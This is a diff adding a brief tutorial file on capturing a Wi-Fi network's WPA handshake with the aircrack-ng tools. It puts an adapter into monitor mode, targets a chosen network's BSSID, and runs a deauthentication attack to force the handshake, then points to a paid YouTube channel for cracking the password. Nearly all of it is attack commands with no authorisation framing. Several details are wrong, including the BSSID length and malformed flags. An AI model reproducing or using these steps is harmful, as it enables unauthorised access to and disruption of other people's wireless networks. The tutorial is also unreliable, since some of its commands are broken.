@@ -1,0 +1,22 @@
+Use a wireless adapter which supports monitor mode 
+Suggested adapters are Alpha Adapters
+HERE I SUPPOSE ADAPTER NAME WLAN0
+
+##Commands##
+---------> Put wireless card in monitor mode
+sudo airmon-ng wlan0 start
+
+---------> Start seaching networks
+sudo airodump-ng wlan0
+
+---------> Now stop if have your network names 
+key press (CTRL+z)
+
+--------> Attack the target network (filename is the file you want to save)
+sudo airodump-ng --bssid (type here 32 digits bssid of network you targeted) --channel (1-3 number) -write filename.txt wlan0
+
+-------> Run deauth if handshake is not captured
+sudo aireplay-ng deauth 10 -a (bssid) -c (station id) wlan0
+
+CONGRATS HANDSHAKE IS CAPTURED 
+HOW TO USE THAT HANDSHAKE TO CRACK PASSWORD WILL BE SHOWN ON YOUTUBE CHANNEL (PAID)
